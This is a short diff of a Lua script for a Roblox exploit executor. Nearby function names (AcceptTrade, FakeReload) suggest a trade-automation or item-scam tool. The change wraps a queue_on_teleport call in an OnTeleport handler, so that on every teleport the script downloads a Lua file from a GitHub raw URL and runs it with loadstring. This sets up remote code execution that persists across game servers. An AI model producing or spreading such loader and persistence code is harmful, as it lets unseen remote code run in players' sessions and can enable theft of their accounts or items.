@@ -305,7 +305,11 @@ local function AcceptTrade(SessionID)
 	})
 end
 
-queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/umidk1837bss/purple-atlas/refs/heads/main/ap.lua'))()")
+game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
+    if State == Enum.TeleportState.Started then
+        queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/umidk1837bss/purple-atlas/refs/heads/main/ap.lua'))()")
+    end
+end)
 
 local function FakeReload()
 	local HttpService = game:GetService("HttpService")
